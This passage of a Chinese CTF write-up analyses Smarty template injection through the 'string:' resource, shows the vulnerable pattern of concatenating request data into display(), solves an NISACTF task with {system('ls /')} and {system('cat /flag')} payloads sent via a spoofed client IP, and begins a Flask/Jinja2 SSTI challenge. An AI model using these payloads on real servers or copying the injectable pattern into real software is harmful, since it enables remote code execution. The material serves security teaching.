<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">display</span><br><span class="line">Smarty_Internal_TemplateBase._execute</span><br><span class="line"></span><br><span class="line">Smarty_Internal_Template.render</span><br><span class="line">//这里会进行模板是否存在的检测，不存在就直接返回了，这里的模板指的是`string:&#123;phpinfo()&#125;`中的`string`，然后就会进行模板的一些处理</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.render</span><br><span class="line">//这里也会进行模板检测，不太清楚和前面有啥区别</span><br><span class="line"></span><br><span class="line">Smarty_Template_Compiled.process</span><br><span class="line">//这个函数比较关键，后续基本都是从这里展开的</span><br></pre></td></tr></table></div></figure>


        <h3 id="模板创建"   >
          <a href="#模板创建" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板创建" class="headerlink" title="模板创建"></a>模板创建</h3>
      <p>当最开始没有进行该模板创建时，会创建模板，在前期调用链中还有后续的一些链子</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Smarty_Template_Compiled.compileTemplateSource</span><br><span class="line">//创建</span><br><span class="line">Smarty_Template_Compiled.loadCompiledTemplate</span><br><span class="line">//创建完成之后加载调用</span><br></pre></td></tr></table></div></figure>

<p>下面分析更多</p>
<p>调用到<code>Smarty_Template_Compiled.compileTemplateSource</code>函数，然后在<code>write</code>函数中</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164052011.png" alt="image-20230111164052011"></p>
<p>回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplate</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164116060.png" alt="image-20230111164116060"></p>
<p>里面调用<code>create</code>函数再回调到<code>Smarty_Internal_TemplateCompilerBase.compileTemplateSource</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164320942.png" alt="image-20230111164320942"></p>
<p>该函数最终会调用<code>getContent</code>函数，依据不同的<code>handler</code>调用到不同类的处理函数中，比如<code>string</code>对应的类就是<code>Smarty_Internal_Resource_String</code>，会调用到其<code>decode</code>函数进行相关内容处理</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164515198.png" alt="image-20230111164515198"></p>
<p>比如这里的这里提到的例子里面的<code>string</code>就是<code>&#123;phpinfo()&#125;</code>，相关处理后就直接返回内容，然后在后续的操作中，将该内容连同一些数据写入到指定的<code>templates_c</code>文件夹中<code>hash</code>之后的一个<code>php</code>文件，这里就会如下结果</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Smarty version 4.3.0, created on 2023-01-11 16:48:16</span></span><br><span class="line"><span class="comment">  from &#x27;ce7370c7e6956f1e6a18ad78cf4f6e48dabb61b3&#x27; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> Smarty_Internal_Template $_smarty_tpl */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_smarty_tpl</span>-&gt;_decodeProperties(<span class="variable">$_smarty_tpl</span>, <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">&#x27;version&#x27;</span> =&gt; <span class="string">&#x27;4.3.0&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;unifunc&#x27;</span> =&gt; <span class="string">&#x27;content_63be77d0cad990_36655883&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;has_nocache_code&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">  <span class="string">&#x27;file_dependency&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">  <span class="string">&#x27;includes&#x27;</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">  ),</span><br><span class="line">),<span class="literal">false</span>)) &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">content_63be77d0cad990_36655883</span> (<span class="params">Smarty_Internal_Template <span class="variable">$_smarty_tpl</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> phpinfo();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后在后续的<code>Smarty_Template_Compiled.loadCompiledTemplate</code>中会对该文件进行包含，执行其中的<code>php</code>代码，这里可能是因为<code>smarty</code>一些机制原因，必定在包含的时候能够执行到里面对应的那个函数。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111165045717.png" alt="image-20230111165045717"></p>

        <h3 id="模板调用"   >
          <a href="#模板调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#模板调用" class="headerlink" title="模板调用"></a>模板调用</h3>
      <p>当存在该模板，也就是<code>string:&#123;phpinfo()&#125;</code>对应的模板，就会在<code>Smarty_Template_Compiled.process</code>函数中，也就是如下红框中，直接进行对应的模板文件包含，同样也是可以执行代码的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111171930724.png" alt="image-20230111171930724"></p>

        <h3 id="其他类模板"   >
          <a href="#其他类模板" class="heading-link"><i class="fas fa-link"></i></a><a href="#其他类模板" class="headerlink" title="其他类模板"></a>其他类模板</h3>
      <p>前面提到的是<code>string</code>类的模板，同样也可能会有自定义的，比如如下</p>
<p>参考：[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://chybeta.github.io/2018/01/23/CVE-2017-1000480-Smarty-3-1-32-php%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" >CVE-2017-1000480]Smarty &lt;= 3.1.32 php代码执行 漏洞分析 | Chybeta</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">extends</span> <span class="title">Smarty_Resource_Custom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$name</span>,&amp;<span class="variable">$source</span>,&amp;<span class="variable">$mtime</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$source</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$mtime</span> = time();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;test:&#123;phpinfo()&#125;&quot;</span>);</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>$name</code>就是对应的<code>&#123;phpinfo()&#125;</code>，将其赋值给<code>$source</code>从而在后续的<code>smarty</code>处理中形成对应的<code>content</code>，因为在<code>write</code>过程中之前提到会有<code>getContent</code>的调用，使用自定义类<code>Smarty_Resource_Custom</code>就会调用到该类的<code>fetch</code>函数，传入的<code>source</code>就是<code>content</code>，从而为<code>content</code>赋值。</p>

        <h2 id="漏洞形式"   >
          <a href="#漏洞形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞形式" class="headerlink" title="漏洞形式"></a>漏洞形式</h2>
      <p>常见的漏洞形式如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;string:&quot;</span>.<span class="variable">$data</span>);</span><br></pre></td></tr></table></div></figure>

<p>这样<code>data</code>就是可控的，那么相关的代码执行就是水到渠成了。</p>

        <h2 id="题目"   >
          <a href="#题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目" class="headerlink" title="题目"></a>题目</h2>
      <p>相对于这道题就可以猜测了，大概就是会接收我们的<code>ip</code>，然后和它的模板进行拼接然后输出，其实测试一下就可以了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111174624907.png" alt="image-20230111174624907"></p>
<p>很明显，可以代码执行，即可完成</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#x27;ls /&#x27;)&#125;</span><br><span class="line">&#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></div></figure>

<p>具体看看代码，放个木马上去下载一下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;smarty/libs/Smarty.class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;debugging = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;caching = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$smarty</span>-&gt;assign(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>]))&#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>])) &#123;</span><br><span class="line">           <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$real_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(getenv(<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>))&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv( <span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>)) &#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="variable">$real_ip</span> = getenv(<span class="string">&quot;REMOTE_ADDR&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="variable">$template_string</span> = <span class="string">&#x27;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;A Simple IP Address API&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;./css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;float:left;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;IP&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 class=&quot;hidden-xs hidden-sm&quot;&gt;A Simple Public IP Address API&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;div style=&quot;float:right;margin-top:30px;&quot;&gt;Current IP:&#x27;</span>.<span class="variable">$real_ip</span>.<span class="string">&#x27;		&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;why row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;Why use?&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        Do you need to get the public IP address ? Do you have the requirements to obtain the servers’ public IP address? Whatever the reason,sometimes a public IP address API are useful.</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;</span></span><br><span class="line"><span class="string">                        You should use this because:</span></span><br><span class="line"><span class="string">                    &lt;/p&gt;&lt;ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;li&gt;You can initiate requests without any limit.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;li&gt;Does not record the visitor information.&lt;/li&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;/ul&gt;</span></span><br><span class="line"><span class="string">                    &lt;p&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;api row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;API Usage&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-11&quot;&gt;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;table-responsive&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;table class=&quot;table table-striped table-bordered table-hover&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;-&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;API URI&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td width=&quot;50px&quot;&gt;Type&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;Sample Output&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;/thead&gt;</span></span><br><span class="line"><span class="string">                            &lt;tbody&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get IP&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;api&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            &lt;tr&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;get XFF(X-Forwarded-For)&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;http://&#x27;</span> .<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>].<span class="string">&#x27;xff&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;text/html&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                                &lt;td&gt;&lt;code&gt;8.8.8.8&lt;/code&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">                            &lt;/tr&gt;</span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            </span></span><br><span class="line"><span class="string">                            &lt;/tbody&gt;</span></span><br><span class="line"><span class="string">                        &lt;/table&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;examples row&quot;&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;col-xs-12&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h2 style=&quot;margin-bottom:0;&quot;&gt;Connection&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;row&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;col-xs-offset-1 col-xs-10&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;h3&gt;Request-Header&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;pre&gt;GET / HTTP/2.0</span></span><br><span class="line"><span class="string">Host: www.ip.la</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Dnt: 1</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;footer&gt;</span></span><br><span class="line"><span class="string">        &lt;p style=&quot;text-align:center;font-size:14px;&quot;&gt;Build With Smarty !&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/footer&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;string:&#x27;</span>.<span class="variable">$template_string</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到<code>$template_string</code>中包含了我们可以控制的<code>$real_ip</code></p>

        <h1 id="NISACTF-2022-midlevel"   >
          <a href="#NISACTF-2022-midlevel" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1>
      <p>和上一道题一模一样，不太懂意义在哪里</p>

        <h1 id="NISACTF-2022-is-secret"   >
          <a href="#NISACTF-2022-is-secret" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155550917.png" alt="image-20230112155550917"></p>
<p>试试输入<code>secret</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155613805.png" alt="image-20230112155613805"></p>
<p>看来还得输入参数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155641182.png" alt="image-20230112155641182"></p>
<p>随便输点，发现报错了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155719927.png" alt="image-20230112155719927"></p>
<p>依据报错信息可以判断用的是<code>python2</code>下<code>flask</code>，报错信息中有比较关键的部分</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File &quot;/app/app.py&quot;, line 35, in secret</span><br><span class="line">a=render_template_string(safe(deS))</span><br></pre></td></tr></table></div></figure>

<p>这个函数<code>render_template_string</code>通常和<code>SSTI</code>模板注入有关，和之前的<code>php</code>中的相关模板注入有点类似，而且在火狐浏览器中居然可以点开查看代码，在<code>edge</code>和<code>chrome</code>都不行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112161329622.png" alt="image-20230112161329622"></p>
<p>可以看到，那个<code>secret</code>应该是我们控制的，因为没有<code>secret</code>的时候，确实输出了那个文字，有了就会输出其他的。</p>
<p>中间看代码，将输入的<code>secret</code>通过<code>rc4</code>进行解密，那个<code>HereIsTreasure</code>应该就是密钥，然后字节放入<code>render_template_string</code>函数中，那么就肯定存在<code>SSTI</code>模板注入</p>

        <h2 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>了解<code>flask</code>的<code>SSTI</code>还是需要一些前置知识的，如下代码示例</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;&#x27;abc&#x27;.__class__&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>当访问<code>ip:port/test</code>时，出现如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162026870.png" alt="image-20230112162026870"></p>
<p>返回了一个类名字，这个其实就相当于在<code>python</code>里面执行了<code>&#39;abc&#39;.__class__</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162115798.png" alt="image-20230112162115798"></p>
<p>那么对应的，这个标签<code>&#123;&#123;xxx&#125;&#125;</code>，修改里面的<code>xxx</code>，即可获得任意<code>python</code>代码执行的能力。但是这里的代码执行和正常的<code>python</code>还是有点区别的，比如如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;print(&#x27;aaaa&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>就会出现如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162739395.png" alt="image-20230112162739395"></p>
<p>原因就在于使用的模板引擎是<code>jinja2</code>，它有自己的一套规则，基本的语法如下</p>
<ul>
<li>控制结构 <code>&#123;% %&#125;</code></li>
<li>变量取值 <code>&#123;&#123; &#125;&#125;</code></li>
<li>注释 <code>&#123;# #&#125;</code></li>
</ul>
<p>那么将刚刚的示例修改一下</p>
